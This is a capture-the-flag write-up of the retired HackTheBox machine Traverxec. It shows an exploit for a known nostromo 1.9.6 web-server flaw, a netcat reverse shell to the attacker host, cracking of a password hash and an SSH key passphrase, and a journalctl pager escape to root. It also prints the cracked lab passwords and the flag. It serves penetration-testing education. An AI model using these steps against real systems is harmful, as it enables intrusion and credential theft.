---
title: "HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide"
description: "Complete walkthrough of HackTheBox Traverxec machine. Learn web application exploitation, privilege escalation, and Linux penetration testing techniques."
keywords: ["hackthebox traverxec", "linux exploitation", "web application security", "privilege escalation", "penetration testing", "ctf walkthrough"]
tags: ["hackthebox", "linux", "web-exploitation", "privilege-escalation", "walkthrough"]
sidebar_position: 1
---

## Brief

:::info Description

These are my notes for the Traverxec (Retired) Box on [HackTheBox](https://hackthebox.com).

Credits: S/o to tedd_918, hunterbot for the assist.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Linux |Easy|4/5|

:::

## KEY LEARNINGS

:::tip

1. enumerating the system thoroughly and methodically is imperative e.g. `sudo -l`, `find -user <username />` (for files owned)
2. learn and document cracking techniques to speed things up e.g. hashcat, ssh2john (new to me)
3. get better at ssh key vector techniques e.g. how to find keys, crack keys, use keys

:::

## RECON

### NMAP

run it all: `sudo nmap -v 10.10.10.165 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-traverxec.txt`

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: TRAVERXEC
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
```

I can see the `http-server-header` information, and browse the website to also see: `nostromo 1.9.6 at 10.10.10.165 Port 80` at the bottom of page.

## EXPLOIT

Use searchsploit to find exploits:

```bash
└─$ searchsploit nostromo 1.9.6
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                           | multiple/remote/47837.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Pull it down:

```bash
└─$ searchsploit -m 47837
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/Documents/RxHack/HTB/BOXES/TRAVERXEC/47837.py
```

I go to edit `47837.py` and see:

```python
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py

#!/usr/bin/env python

import sys
import socket

art = """
```

So I Google `cve2019_16278.py` and find [nostroSploit.py](https://raw.githubusercontent.com/AnubisSec/CVE-2019-16278/master/nostroSploit.py)

Test it out, and I can get remote command execution on the target:

```bash
┌──(rxhackk㉿kali)-[~/…/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]
└─$ python3 ./nostroSploit.py
usage: nostroSploit.py [-h] host port [cmd]
nostroSploit.py: error: the following arguments are required: host, port

┌──(rxhackk㉿kali)-[~/…/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]
└─$ python3 ./nostroSploit.py 10.10.10.165 80 whoami
[+] Connecting to target
[+] Sending malicious payload
HTTP/1.1 200 OK
Date: Thu, 24 Mar 2022 09:20:54 GMT
Server: nostromo 1.9.6
Connection: close


www-data
```

## FOOTHOLD

### reverse shell (netcat)

We get a bind shell from the target back to  our attack host:

```bash
┌──(rxhackk㉿kali)-[~/…/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]
└─$ python3 ./nostroSploit.py 10.10.10.165 80 "nc 10.10.16.2 443 -e /bin/bash"
[+] Connecting to target
[+] Sending malicious payload
```

Set up our listener, and upgrade our shell once we're in there:

```bash
└─$ sudo rlwrap nc -lnvp 443                                                                                   1 ⨯
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.165] 37170
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```

## LINUX ENUMERATION

I try these manual find lines first for various vulnerable file types:

```bash
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

```bash
$ find / -perm /4000
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/sudo
/usr/bin/umount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
```

### linpeas

From my attack host I do a `sudo python3 http.server 80` where my tools are, and then `wget` it from my reverse shell.

I run `linpeas.sh`

```bash
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 427K Oct  6  2019 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 154K Oct 12  2019 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1
699.24.8
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/
9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
```

this looks interesting:

```bash
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

## CRACKING

### .htpasswd

Using `john` the ripper, the `rockyou.txt` wordlist and the hash copied to my attack host:

```bash
RxHackk 福 ~/Repos/RxHack/HTB/BOXES/TRAVERXEC/crack ➤ 431f6ec|main⚡
601 💀 ± ➤ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:39 12.80% (ETA: 20:31:49) 0g/s 50608p/s 50608c/s 50608C/s auytun..autsang123
0g 0:00:00:42 13.74% (ETA: 20:31:50) 0g/s 50443p/s 50443c/s 50443C/s AVISALARI..AUGUST6
0g 0:00:03:05 65.97% (ETA: 20:31:25) 0g/s 50083p/s 50083c/s 50083C/s breech89..breeanna91
Nowonly4me       (david)
1g 0:00:03:31 DONE (2022-04-05 20:30) 0.004736g/s 50107p/s 50107c/s 50107C/s Noyoudo..November^
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I try `su - david` and `ssh david@10.10.10.165`, but this password doesn't work for those.

## MORE LINUX ENUM

### review linpeas.sh output

Run linpeas again and see what else I can find:

```bash
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
```

### nostromo config files

So, after few hints from Tedd in chat, I review `/var/nostromo/conf/` folder, and in the config file it has this:

```bash
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

According to nostromo, this means `/home/*/public_www` is accessible to the `www-data` user.

### public folders

go here `/home/david/public_www`

```bash
cd /home/david/public_www
ls
ls
index.html  protected-file-area
ls -al
ls -al
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
cd protected-file-area
cd protected-file-area
ls
ls
backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$
```

## PRIVESC USER

### ssh keys

From `/home/david/public_www` folder we found a backup of the users ssh keys.

Copy *.tgz to /tmp and then untar

```bash
tar xvf backup-ssh-identity-files.tgz
tar xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

copied `id_rsa` to local machine, then `ssh -i ./id_rsa david@10.10.10.165`

using the `.htpasswd` cracked hash doesn't work, so we try to crack the private key itself `id_rsa`

use `ssh2john` to convert the `id_rsa` file to john crackable format: `python2 /usr/share/john/ssh2john.py ../keys/id_pub > id_pub.hash`

```bash
RxHackk 福 ~/Repos/RxHack/HTB/BOXES/TRAVERXEC/crack ➤ 431f6ec|main⚡
697 💀 ± ➤ john --wordlist=/usr/share/wordlists/rockyou.txt id_pub.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (../keys/id_pub)
1g 0:00:00:36 DONE (2022-04-05 21:33) 0.02737g/s 392600p/s 392600c/s 392600C/sa6_123..*7¡Vamos!
Session completed
```

re-try ssh, with the cracked `.htpasswd` passphrase:

```bash
708 💀 ± ➤ ssh -i ./id_rsa david@10.10.10.165
Enter passphrase for key './id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$
```

## PRIVESC ROOT

### journalctl less

There a script in davids `~/bin` directory with this command: `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2022-04-05 04:25:57 EDT, end at Tue 2022-04-05 06:22:22 EDT. --
Apr 05 04:56:24 traverxec sudo[5475]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Apr 05 04:56:24 traverxec sudo[5475]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=list
Apr 05 04:56:25 traverxec nologin[5516]: Attempted login by UNKNOWN on UNKNOWN
Apr 05 05:07:22 traverxec su[12115]: pam_unix(su-l:auth): authentication failure; logname= uid=33 euid=0 tty=pts/1 ruser=www-data r
Apr 05 05:07:24 traverxec su[12115]: FAILED SU (to root) www-data on pts/1
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
#
# cd /root
# ls
nostromo_1.9.6-1.deb  root.txt
# cat root.txt
9aa36a6d76f785dfd320a478f6e0d906
#
```
